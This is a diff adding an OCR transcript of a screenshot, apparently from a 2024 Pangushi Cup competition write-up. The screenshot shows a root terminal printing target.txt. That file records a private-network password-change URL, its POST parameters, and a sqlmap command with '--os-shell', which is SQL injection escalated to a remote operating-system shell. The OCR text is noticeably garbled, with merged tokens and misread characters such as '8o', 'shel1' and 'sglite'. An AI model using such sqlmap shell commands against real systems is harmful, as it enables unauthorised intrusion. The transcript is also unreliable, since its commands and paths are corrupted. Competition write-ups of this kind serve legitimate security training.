@@ -1,0 +1,11 @@
+# OCR: b0d128b5c25882dbb578132d762d3813.webp
+# 来源: ./02-WriteUp/2024/2024-盘古石杯-总决赛/b0d128b5c25882dbb578132d762d3813.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:17
+
+root@localhost192.168.11.61#ls
+dump
+Logsession.sglitetarget.txt
+[root@localhost192.168.11.6]#cattarget.txt
+http://192.168.11.6:8o/Home/User/tkpwdpost.html(PosT)#sqlmap-py-r1.txt--os-shel1 pwd=123456&re_pwd=123456&uid=295[root@localhost192.168.11.6]#
+-ttouzilc3.txt
